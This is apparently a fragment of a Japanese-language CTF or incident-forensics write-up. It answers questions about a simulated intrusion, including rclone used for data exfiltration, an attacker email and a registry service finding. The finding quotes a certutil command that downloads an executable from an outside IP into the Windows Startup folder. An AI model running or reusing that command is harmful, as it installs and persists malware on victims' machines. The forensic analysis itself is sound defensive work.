...
- **アプローチ・証拠:**
  ...
  - `Remote Host WKSTN-3847 (10.10.192.101)`
---

### Task X: [What is the full file path of the binary used by the attacker to exfiltrate data?]
- **回答:** `[C:\Users\dbadmin\.rclone\rclone-v1.66.0-windows-amd64\rclone.exe]`
- **アプローチ・証拠:**
  - `[ユーザのフォルダに不審なものがあった、調べたところクラウドにファイルをsincするものだった。]`

---


### Task X: [What email is used by the attacker to exfiltrate sensitive data?]
- **回答:** `[annajones291@hotmail.com]`
- **アプローチ・証拠:**
  - `[上記で確認したファイルの設定ファイルをみる。]`
...
- **回答:** `[回答]`
- **アプローチ・証拠:**
  - `[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services　を確認したところ以下を確認]`
```cmd 
C:\Windows\System32\certutil.exe -urlcache -split -f http://128.199.247[.]173/status.exe C:\Users\Administtrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\status.exe'
```
---
